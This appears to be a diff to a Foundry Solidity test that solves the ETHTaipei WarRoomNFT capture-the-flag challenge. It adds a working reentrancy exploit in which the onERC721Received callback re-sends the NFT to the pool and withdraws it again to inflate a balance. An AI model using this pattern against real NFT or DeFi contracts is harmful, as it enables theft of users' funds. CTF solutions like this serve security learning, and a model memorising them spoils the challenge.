@@ -5,6 +5,7 @@ pragma experimental ABIEncoderV2;
 import {Test} from "forge-std/Test.sol";
 import {Pool, PoolBase} from "src/ETHTaipeiWarRoomNFT/Pool.sol";
 import {WarRoomNFT} from "src/ETHTaipeiWarRoomNFT/NFT.sol";
+import {IERC721} from "openzeppelin-contracts-07/contracts/token/ERC721/IERC721.sol";
 
 contract PoolTest is Test {
     Pool public pool;
@@ -21,18 +22,36 @@ contract PoolTest is Test {
     }
 
     function testExploit() public {
+        nft = base.nft();
+        pool = base.pool();
+
         // Exploit should be implemented here...
+        // goal: _balances[user] > 1000 ether;
+        // we have one NFT at the very beginning
+
+        require(nft.balanceOf(address(this)) == 1, "where is my nft?");
+        require(nft.ownerOf(1) == address(this), "is this not my nft?");
+
+        IERC721(nft).approve(address(pool), 1);
+        pool.deposit(1);
+        pool.withdraw(1);
 
         base.solve();
         assertTrue(base.isSolved());
     }
 
     function onERC721Received(address, address, uint256 tokenId, bytes memory) external returns (bytes4) {
-        if (times < 1) {
+        nft = base.nft();
+        pool = base.pool();
+
+        if (times == 0) {
             times++;
-            nft.safeTransferFrom(address(this), address(pool), 1);
-            pool.withdraw(tokenId);
+
+            // Exploit should be implemented here...
+            IERC721(nft).transferFrom(address(this), address(pool), 1);
+            pool.withdraw(1);
         }
+
         return this.onERC721Received.selector;
     }
 }
